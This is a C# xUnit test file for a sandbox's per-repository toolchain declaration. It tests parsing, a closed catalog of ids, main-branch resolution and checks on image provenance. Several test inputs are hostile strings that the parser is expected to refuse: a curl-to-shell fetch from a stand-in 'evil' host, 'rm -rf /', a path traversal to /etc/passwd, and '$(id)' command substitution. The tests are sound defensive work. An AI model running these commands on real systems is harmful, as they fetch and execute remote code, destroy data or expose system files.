using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Mainguard.Agents.Agents.Sandbox;
using Mainguard.Git.Exceptions;
using Xunit;

namespace Mainguard.Tests;

/// <summary>
/// MG-42 — the per-repo verification-toolchain declaration: its format, its resolution rules, and the
/// closed catalog that makes the format safe to have in a repository an agent can write to.
///
/// <para>The threat these tests are about is not "a bad package gets installed". It is that a file in
/// the repo decides what runs as root inside the jail at provision time, before any verification and
/// before any human reads the diff. Two things answer it, and both are asserted here: the file can only
/// <b>select</b> from a product-owned catalog, and only <b>main's</b> copy is ever provisioned.</para>
/// </summary>
public class ToolchainDeclarationTests
{
    private const string Repo = "repo-under-test";

    // ---- format ----------------------------------------------------------

    [Fact]
    public void OneIdPerLine_CommentsAndBlanksIgnored()
    {
        var declaration = ToolchainDeclarationResolver.Parse(
            "# what this project needs\n\ndotnet-10   # the SDK\n\n", Repo);

        Assert.Equal(new[] { "dotnet-10" }, declaration.Ids);
    }

    [Fact]
    public void DuplicateIds_CollapseToOne()
    {
        Assert.Equal(new[] { "dotnet-10" }, ToolchainDeclarationResolver.Parse("dotnet-10\ndotnet-10\n", Repo).Ids);
    }

    [Fact]
    public void CrlfAndLf_NormaliseIdentically()
    {
        Assert.Equal(
            ToolchainDeclarationResolver.Parse("dotnet-10\nrust-stable\n", Repo).Normalized,
            ToolchainDeclarationResolver.Parse("dotnet-10\r\nrust-stable\r\n", Repo).Normalized);
    }

    [Fact]
    public void AnAbsentFile_IsAnEmptyDeclaration_NotAnError()
    {
        // "This repo needs nothing beyond the base image" is the state every repo is in today and has
        // to stay a first-class answer, or shipping this feature breaks every existing repo.
        var resolution = ToolchainDeclarationResolver.Resolve(branchConfigContent: null, mainConfigContent: null);
        Assert.True(resolution.Provisioned.IsEmpty);
        Assert.False(resolution.ChangedVsMain);
    }

    // ---- the closed catalog ----------------------------------------------

    [Fact]
    public void AnUncataloguedId_IsATypedRefusal_NotASilentSkip()
    {
        var ex = Assert.Throws<UnknownToolchainException>(
            () => ToolchainDeclarationResolver.Parse("cobol-85\n", Repo));

        Assert.Equal("cobol-85", ex.UnknownId);
        // The message has to list what IS available, or the human's next move is to guess.
        Assert.Contains("dotnet-10", ex.Message, StringComparison.Ordinal);
    }

    /// <summary>
    /// The line that matters most: the declaration file cannot describe an installation. Each of these
    /// is a way someone would try to smuggle one in, and each must be refused at parse time rather than
    /// relied upon to miss the catalog lookup.
    /// </summary>
    [Theory]
    [InlineData("dotnet-10 && curl http://evil/x | sh")]
    [InlineData("dotnet-10; rm -rf /")]
    [InlineData("https://evil.example/payload.tgz")]
    [InlineData("../../../etc/passwd")]
    [InlineData("nixpkgs#hello")]
    [InlineData("$(id)")]
    [InlineData("dotnet-10 --extra-flag")]
    public void ALineThatIsNotABareId_IsRefused(string line)
    {
        // Base type on purpose: `nixpkgs#hello` loses its `#hello` to comment stripping and then fails
        // the CATALOG lookup rather than the grammar, which is a different subclass and an equally hard
        // refusal. Pinning the exact subclass here would be asserting the route, not the outcome.
        Assert.ThrowsAny<ToolchainProvisioningException>(() => ToolchainDeclarationResolver.Parse(line + "\n", Repo));
    }

    /// <summary>A line that is not even shaped like an id reports as malformed, not as an unlucky
    /// catalog miss — the two send the reader to different fixes.</summary>
    [Fact]
    public void AMalformedLine_ReportsAsMalformed_NotAsAnUnknownToolchain()
    {
        var ex = Assert.ThrowsAny<ToolchainProvisioningException>(
            () => ToolchainDeclarationResolver.Parse("dotnet-10 && curl http://evil/x | sh\n", Repo));

        Assert.IsNotType<UnknownToolchainException>(ex);
        Assert.Contains("is not a toolchain id", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void MoreToolchainsThanTheCap_IsRefused()
    {
        var many = string.Join("\n", ToolchainCatalog.KnownIds.Take(ToolchainCatalog.MaxDeclaredToolchains + 1));
        Assert.True(
            ToolchainCatalog.KnownIds.Count > ToolchainCatalog.MaxDeclaredToolchains,
            "the catalog must hold more ids than the cap or this test cannot exercise the cap at all");

        Assert.Throws<ToolchainProvisioningException>(() => ToolchainDeclarationResolver.Parse(many, Repo));
    }

    [Fact]
    public void EveryCataloguedId_MatchesTheIdGrammar()
    {
        // If the catalog itself held an id the grammar rejects, that toolchain would be undeclarable —
        // present in the table, unreachable from any repo.
        var grammar = new Regex(ToolchainCatalog.IdPattern);
        foreach (var id in ToolchainCatalog.KnownIds)
        {
            Assert.True(grammar.IsMatch(id), $"catalogued id '{id}' does not match {ToolchainCatalog.IdPattern}");
        }
    }

    [Fact]
    public void NoCatalogRecipe_ReachesAGitHostFromTheJail()
    {
        // The recipes DO reach github.com — at BUILD time, on the VM's network. What must never happen
        // is one of those hosts arriving on the agent egress allowlist, because the git host's absence
        // from it is the A6 control itself. This pins the two sets apart.
        foreach (var recipe in ToolchainCatalog.All.Values)
        {
            foreach (var host in recipe.BuildEgressHosts)
            {
                Assert.False(
                    EgressAllowlist.DefaultEntries.Any(e =>
                        string.Equals(e.HostPattern, host, StringComparison.OrdinalIgnoreCase)),
                    $"'{host}' is a toolchain BUILD host and must not be an agent egress default ({recipe.Id}).");
            }
        }
    }

    [Fact]
    public void EveryRecipe_CarriesAProbe()
    {
        // A recipe with no probe is a recipe whose absence from the jail cannot be detected, which is
        // exactly the silent failure the whole feature is meant to avoid.
        foreach (var recipe in ToolchainCatalog.All.Values)
        {
            Assert.NotEmpty(recipe.Probe);
            Assert.NotEmpty(recipe.InstallSteps);
        }
    }

    /// <summary>
    /// The catalog's nixpkgs revision must be the SAME one the agent base image bakes. Two revisions
    /// would mean the base's curated tools and a per-repo layer's tools came from different universes,
    /// which is how a jail ends up with two incompatible glibcs. Read from the Dockerfile so it cannot
    /// drift silently.
    /// </summary>
    [Fact]
    public void CatalogNixpkgsRevision_MatchesTheAgentBaseImage()
    {
        var dockerfile = Path.Combine(RepoRoot(), "images", "mainguard-agent-base", "Dockerfile");
        Assert.True(File.Exists(dockerfile), $"agent-base Dockerfile not found at {dockerfile}");

        var match = Regex.Match(File.ReadAllText(dockerfile), @"ARG\s+NIXPKGS_REV=([0-9a-f]{40})");
        Assert.True(match.Success, "could not find `ARG NIXPKGS_REV=<sha>` in the agent-base Dockerfile");
        Assert.Equal(ToolchainCatalog.NixpkgsRev, match.Groups[1].Value);
    }

    // ---- resolution (mirrors VerificationCommandResolver) -----------------

    [Fact]
    public void MainIsWhatGetsProvisioned_EvenWhenTheBranchSaysOtherwise()
    {
        var resolution = ToolchainDeclarationResolver.Resolve(
            branchConfigContent: "rust-stable\n", mainConfigContent: "dotnet-10\n");

        Assert.Equal(new[] { "dotnet-10" }, resolution.Provisioned.Ids);
        Assert.Equal(new[] { "rust-stable" }, resolution.Declared.Ids);
    }

    [Fact]
    public void BranchDrift_IsFlagged()
    {
        Assert.True(ToolchainDeclarationResolver.Resolve("rust-stable\n", "dotnet-10\n").ChangedVsMain);
    }

    [Fact]
    public void IdenticalSides_AreNotFlagged()
    {
        Assert.False(ToolchainDeclarationResolver.Resolve("dotnet-10\n", "dotnet-10\n").ChangedVsMain);
    }

    [Fact]
    public void RemovingTheDeclarationOnABranch_IsFlagged()
    {
        Assert.True(ToolchainDeclarationResolver.Resolve(branchConfigContent: null, mainConfigContent: "dotnet-10\n").ChangedVsMain);
    }

    [Fact]
    public void AddingADeclarationWhereMainHasNone_IsFlagged()
    {
        Assert.True(ToolchainDeclarationResolver.Resolve("dotnet-10\n", mainConfigContent: null).ChangedVsMain);
    }

    /// <summary>
    /// A branch may write anything at all into its copy — that is the premise. It must produce a FLAG,
    /// not an exception: an exception on the daemon's verification path would be a way for one branch to
    /// wedge the queue for the whole repo.
    /// </summary>
    [Fact]
    public void AHostileBranchDeclaration_Flags_AndDoesNotThrow()
    {
        var resolution = ToolchainDeclarationResolver.Resolve(
            branchConfigContent: "dotnet-10 && curl http://evil/x | sh\n", mainConfigContent: "dotnet-10\n");

        Assert.True(resolution.ChangedVsMain);
        Assert.Equal(new[] { "dotnet-10" }, resolution.Provisioned.Ids);
    }

    /// <summary>
    /// ...and specifically it must not NORMALISE its way to equality. If the parser split lines on
    /// whitespace, "dotnet-10 && curl …" would yield an id list starting with "dotnet-10" and the
    /// comparison against main could match.
    /// </summary>
    [Fact]
    public void AHostileBranchDeclaration_DoesNotNormaliseIntoEqualityWithMain()
    {
        Assert.True(ToolchainDeclarationResolver
            .Resolve(branchConfigContent: "dotnet-10 && curl http://evil/x | sh\n", mainConfigContent: "dotnet-10\n")
            .ChangedVsMain);
    }

    /// <summary>The human-owned pin overrides both sides and is never flagged — the same escape hatch
    /// <c>VerificationCommandResolver</c>'s <c>pinnedCommand</c> is.</summary>
    [Fact]
    public void AHumanPin_OverridesBothSides_AndIsNeverFlagged()
    {
        var resolution = ToolchainDeclarationResolver.Resolve(
            branchConfigContent: "rust-stable\n", mainConfigContent: "ruby-3\n", pinnedToolchain: "dotnet-10");

        Assert.Equal(new[] { "dotnet-10" }, resolution.Provisioned.Ids);
        Assert.False(resolution.ChangedVsMain);
    }

    [Fact]
    public void AMalformedMainBaseline_Throws_RatherThanProvisioningNothing()
    {
        // Degrading to "install nothing" would produce a jail without the tools the repo's verify
        // command names, and every verification would then fail for a reason that reads like the
        // agent's fault.
        Assert.Throws<UnknownToolchainException>(
            () => ToolchainDeclarationResolver.Resolve(branchConfigContent: null, mainConfigContent: "not-a-toolchain\n"));
    }

    // ---- the image layer -------------------------------------------------

    private const string BaseDigest = "sha256:" + "ab12cd34" + "00000000000000000000000000000000000000000000000000000000";

    [Fact]
    public void TheGeneratedDockerfile_BuildsOnTheDigestPinnedBase()
    {
        var dockerfile = ToolchainProvisioner.RenderDockerfile(
            BaseDigest, new[] { ToolchainCatalog.TryGet("dotnet-10")! });

        Assert.Contains($"FROM {BaseDigest}", dockerfile, StringComparison.Ordinal);
        // No COPY/ADD: the build context is a single generated file, so the layer can absorb nothing
        // from the host.
        Assert.DoesNotContain("\nCOPY ", dockerfile, StringComparison.Ordinal);
        Assert.DoesNotContain("\nADD ", dockerfile, StringComparison.Ordinal);
    }

    /// <summary>
    /// The CI regression, pinned. <c>FROM name@sha256:…</c> is a canonical REGISTRY reference: the
    /// engine matches it against an image's <c>RepoDigests</c> and, finding none — which is the normal
    /// state of a locally built image on a classic overlay2 store — tries to PULL, giving
    /// <c>pull access denied for mainguard-agent-base</c> at step 1. It passed locally only because
    /// this box's containerd image store synthesises a <c>RepoDigests</c> entry equal to the image's own
    /// Id. A bare digest is an IMAGE ID reference, resolved against the local store on both engines.
    /// </summary>
    [Fact]
    public void TheGeneratedDockerfile_UsesABareImageId_NotAResolvableRegistryReference()
    {
        var dockerfile = ToolchainProvisioner.RenderDockerfile(
            BaseDigest, new[] { ToolchainCatalog.TryGet("dotnet-10")! });

        var from = dockerfile.Split('\n').Single(l => l.StartsWith("FROM ", StringComparison.Ordinal)).Trim();

        Assert.Equal($"FROM {BaseDigest}", from);
        Assert.DoesNotContain("@", from, StringComparison.Ordinal);
        Assert.DoesNotContain(SandboxImageVersions.AgentBaseName, from, StringComparison.Ordinal);
    }

    [Fact]
    public void TheGeneratedDockerfile_EndsBackOnTheNonRootAgentUser()
    {
        // Installs need root; a layer that FORGOT to drop back would silently change the jail's user
        // and undo a control ContainerSpecBuilder cannot re-check (it asserts the spec, not the image).
        var dockerfile = ToolchainProvisioner.RenderDockerfile(
            BaseDigest, new[] { ToolchainCatalog.TryGet("dotnet-10")! });

        var lastUser = dockerfile
            .Split('\n')
            .Where(l => l.StartsWith("USER ", StringComparison.Ordinal))
            .LastOrDefault();

        Assert.Equal("USER agent", lastUser?.Trim());
    }

    [Fact]
    public void TheImageTag_ChangesWithTheBaseDigest()
    {
        // A layer built on last week's base is a DIFFERENT artefact even with an identical id list;
        // reusing it by tag would silently unpin the base image MG-27 spent a change pinning.
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");
        var other = "sha256:" + new string('f', 64);

        Assert.NotEqual(
            ToolchainProvisioner.ImageTagFor(BaseDigest, declaration),
            ToolchainProvisioner.ImageTagFor(other, declaration));
    }

    [Fact]
    public void TheImageTag_ChangesWithTheDeclaration()
    {
        Assert.NotEqual(
            ToolchainProvisioner.ImageTagFor(BaseDigest, ToolchainDeclarationResolver.Parse("dotnet-10\n")),
            ToolchainProvisioner.ImageTagFor(BaseDigest, ToolchainDeclarationResolver.Parse("rust-stable\n")));
    }

    /// <summary>
    /// The regression the first real-jail run taught: a fix to a RECIPE must change the tag. Hashing
    /// only the ids meant the corrected layer had the same tag as the broken one, so the cache served
    /// the broken layer forever and the fix could never reach a jail.
    /// </summary>
    [Fact]
    public void TheImageTag_ChangesWhenARecipeChanges_EvenThoughTheIdsDoNot()
    {
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");
        var original = ToolchainCatalog.TryGet("dotnet-10")!;
        var corrected = original with
        {
            InstallSteps = original.InstallSteps.Insert(0, "apt-get install -y the-thing-we-forgot"),
        };

        Assert.NotEqual(
            ToolchainProvisioner.ImageTagFor(BaseDigest, declaration, new[] { original }),
            ToolchainProvisioner.ImageTagFor(BaseDigest, declaration, new[] { corrected }));
    }

    [Fact]
    public void TheImageTag_IsStableAcrossCommentEdits()
    {
        // Otherwise every comment edit on main triggers a multi-minute rebuild of an identical layer.
        Assert.Equal(
            ToolchainProvisioner.ImageTagFor(BaseDigest, ToolchainDeclarationResolver.Parse("dotnet-10\n")),
            ToolchainProvisioner.ImageTagFor(BaseDigest, ToolchainDeclarationResolver.Parse("# why\n\ndotnet-10  # sdk\n")));
    }

    [Fact]
    public async Task AnEmptyDeclaration_BuildsNothing_AndStaysOnTheBaseImage()
    {
        var builder = new RecordingBuilder();
        var result = await new ToolchainProvisioner(builder).EnsureAsync(Repo, ToolchainDeclaration.None, BaseDigest);

        Assert.Null(result);
        Assert.Empty(builder.Built);
    }

    [Fact]
    public async Task AnUnpinnedBase_IsRefused()
    {
        // A layer on a mutable tag is a layer whose provenance stops at a pointer.
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");
        await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => new ToolchainProvisioner(new RecordingBuilder()).EnsureAsync(Repo, declaration, "mainguard-agent-base:latest"));
    }

    [Fact]
    public async Task ASecondSpawnWithTheSameDeclaration_DoesNotRebuild()
    {
        // The whole cost story: first spawn builds, every later spawn is two Docker API calls.
        var builder = new RecordingBuilder();
        var provisioner = new ToolchainProvisioner(builder);
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");

        await provisioner.EnsureAsync(Repo, declaration, BaseDigest);
        await provisioner.EnsureAsync("a-different-repo", declaration, BaseDigest);

        Assert.Single(builder.Built);
    }

    [Fact]
    public async Task AnImageHoldingTheTagWithWrongProvenance_IsRebuiltOver()
    {
        // A local tag is a NAME, not evidence about contents. If something else already holds it, using
        // it would mean jailing from an image nobody checked.
        var builder = new RecordingBuilder();
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");
        var tag = ToolchainProvisioner.ImageTagFor(BaseDigest, declaration);
        builder.Squat(tag, new Dictionary<string, string>(StringComparer.Ordinal)
        {
            [ToolchainProvisioner.BaseDigestLabel] = "sha256:" + new string('0', 64),
            [ToolchainProvisioner.SpecLabel] = "dotnet-10",
        });

        await new ToolchainProvisioner(builder).EnsureAsync(Repo, declaration, BaseDigest);

        Assert.Single(builder.Built);
    }

    [Fact]
    public async Task ABuildFailure_IsATypedProvisioningFailure_CarryingTheDetail()
    {
        var builder = new RecordingBuilder { FailWith = "the interpreter said no" };
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");

        var ex = await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => new ToolchainProvisioner(builder).EnsureAsync(Repo, declaration, BaseDigest));

        Assert.Equal(Repo, ex.RepoHandle);
        Assert.Contains("the interpreter said no", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ABuildThatReportsSuccessButLeavesNoImage_IsStillAFailure()
    {
        // "Succeeded" is a claim; the image is the evidence. Believing the claim would hand the spawn
        // path an image ref that does not resolve.
        var builder = new RecordingBuilder { SwallowBuilds = true };
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");

        await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => new ToolchainProvisioner(builder).EnsureAsync(Repo, declaration, BaseDigest));
    }

    /// <summary>
    /// The pin PROVEN rather than requested. The provenance label says which base the image claims;
    /// only the layer chain says what it is made of. An image that carries the right labels and is not
    /// built on the verified base must be refused — that is the case a label check cannot reach, and
    /// the case that matters if the engine ever resolves the <c>FROM</c> to something else.
    /// </summary>
    [Fact]
    public async Task ALayerNotActuallyBuiltOnTheVerifiedBase_IsRefused_DespiteCorrectLabels()
    {
        var builder = new RecordingBuilder { BuildOnAForeignBase = true };
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");

        var ex = await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => new ToolchainProvisioner(builder).EnsureAsync(Repo, declaration, BaseDigest));

        Assert.Contains("NOT built on the verified base", ex.Message, StringComparison.Ordinal);
    }

    /// <summary>
    /// "We could not check" must not read the same as "we checked and it was fine". An engine that will
    /// not answer for the base's layer chain is a refusal — otherwise the proof quietly evaporates on
    /// exactly the engine where it was needed, which is the shape of this whole CI failure.
    /// </summary>
    [Fact]
    public async Task AnUnreadableBaseLayerChain_IsRefused_NotSilentlySkipped()
    {
        var builder = new RecordingBuilder { HideBaseLayers = true };
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");

        var ex = await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => new ToolchainProvisioner(builder).EnsureAsync(Repo, declaration, BaseDigest));

        Assert.Contains("cannot be proven", ex.Message, StringComparison.Ordinal);
    }

    /// <summary>The inheritance proof runs on the CACHE-HIT path too, so a layer that stops matching the
    /// currently-verified base is caught on the next spawn rather than at its next rebuild.</summary>
    [Fact]
    public async Task TheInheritanceProof_AlsoRunsOnACacheHit()
    {
        var builder = new RecordingBuilder();
        var provisioner = new ToolchainProvisioner(builder);
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");

        await provisioner.EnsureAsync(Repo, declaration, BaseDigest);
        Assert.Single(builder.Built);

        // The base's chain moves under the cached layer; the second call is a cache hit by label, and
        // must still refuse.
        builder.RebaseBaseLayers(new[] { "sha256:a-different-base" });

        var ex = await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => provisioner.EnsureAsync(Repo, declaration, BaseDigest));

        Assert.Contains("NOT built on the verified base", ex.Message, StringComparison.Ordinal);
        Assert.Single(builder.Built); // it refused; it did not silently rebuild
    }

    [Fact]
    public async Task TheSpawnRefIsTheLayersDIGEST_NotItsTag()
    {
        // Same pin as the base image: the layer we inspected is the layer the container is created
        // from, so a tag re-pointed in between cannot substitute different bytes.
        var builder = new RecordingBuilder();
        var declaration = ToolchainDeclarationResolver.Parse("dotnet-10\n");

        var result = await new ToolchainProvisioner(builder).EnsureAsync(Repo, declaration, BaseDigest);

        Assert.NotNull(result);
        Assert.True(SandboxImageDigest.IsDigest(result!.ImageRef), $"expected a sha256 digest, got '{result.ImageRef}'");
        Assert.Equal(BaseDigest, result.BaseDigest);
    }

    // ---- harness ---------------------------------------------------------

    private static string RepoRoot()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null && !File.Exists(Path.Combine(dir.FullName, "Mainguard.slnx")))
        {
            dir = dir.Parent;
        }

        Assert.NotNull(dir); // an anchored search: a missing root fails rather than silently passing
        return dir!.FullName;
    }

    /// <summary>An in-memory image store: records builds, answers labels, mints digests, and models
    /// layer inheritance (a built image's chain = the base's chain plus one).</summary>
    private sealed class RecordingBuilder : IToolchainImageBuilder
    {
        private readonly Dictionary<string, Dictionary<string, string>> _images = new(StringComparer.Ordinal);
        private readonly Dictionary<string, IReadOnlyList<string>> _layers = new(StringComparer.Ordinal);

        public RecordingBuilder()
        {
            // The base image's chain. Everything built here extends it, which is what a real engine
            // produces and what the provisioner's prefix check reads.
            _layers[BaseDigest] = new[] { "sha256:layer-a", "sha256:layer-b" };
        }

        public List<string> Built { get; } = new();

        /// <summary>When set, a build produces an image whose chain does NOT extend the base — the
        /// shape of a layer built on something other than the image the preflight verified.</summary>
        public bool BuildOnAForeignBase { get; set; }

        /// <summary>When set, the base image's layer chain cannot be read (an engine that will not
        /// answer). The provisioner must refuse rather than skip the check.</summary>
        public bool HideBaseLayers { get; set; }

        /// <summary>When set, <see cref="BuildAsync"/> throws with this message.</summary>
        public string? FailWith { get; set; }

        /// <summary>When true, a build "succeeds" without producing an image (the lying-builder case).</summary>
        public bool SwallowBuilds { get; set; }

        public void Squat(string tag, Dictionary<string, string> labels) => _images[tag] = labels;

        /// <summary>Moves the base image's layer chain — what a re-pointed or rebuilt base looks like to
        /// an already-cached layer.</summary>
        public void RebaseBaseLayers(IReadOnlyList<string> layers) => _layers[BaseDigest] = layers;

        public Task<IReadOnlyDictionary<string, string>?> InspectLabelsAsync(string imageRef, CancellationToken ct = default) =>
            Task.FromResult<IReadOnlyDictionary<string, string>?>(
                _images.TryGetValue(imageRef, out var labels) ? labels : null);

        public Task<string?> ResolveDigestAsync(string imageRef, CancellationToken ct = default) =>
            Task.FromResult<string?>(_images.ContainsKey(imageRef) ? FakeDigest(imageRef) : null);

        public Task<IReadOnlyList<string>?> RootFsLayersAsync(string imageRef, CancellationToken ct = default)
        {
            if (HideBaseLayers && string.Equals(imageRef, BaseDigest, StringComparison.Ordinal))
            {
                return Task.FromResult<IReadOnlyList<string>?>(null);
            }

            return Task.FromResult(_layers.TryGetValue(imageRef, out var layers) ? layers : null);
        }

        public Task BuildAsync(
            string imageRef, string dockerfile, IReadOnlyDictionary<string, string> labels, CancellationToken ct = default)
        {
            if (FailWith is not null)
            {
                throw new InvalidOperationException(FailWith);
            }

            Built.Add(imageRef);
            if (!SwallowBuilds)
            {
                _images[imageRef] = new Dictionary<string, string>(labels, StringComparer.Ordinal);

                // A real engine stacks the new steps on the parent's chain. `BuildOnAForeignBase`
                // models the one thing the label cannot detect: an image that claims this base and is
                // not made of it.
                var parent = BuildOnAForeignBase
                    ? new[] { "sha256:someone-elses-layer" }
                    : _layers[BaseDigest].ToArray();
                var chain = parent.Append("sha256:toolchain-" + imageRef).ToArray();
                _layers[imageRef] = chain;
                _layers[FakeDigest(imageRef)] = chain; // resolvable by digest too
            }

            return Task.CompletedTask;
        }

        private static string FakeDigest(string seed)
        {
            var hex = Convert.ToHexString(
                System.Security.Cryptography.SHA256.HashData(System.Text.Encoding.UTF8.GetBytes(seed))).ToLowerInvariant();
            return "sha256:" + hex;
        }
    }
}
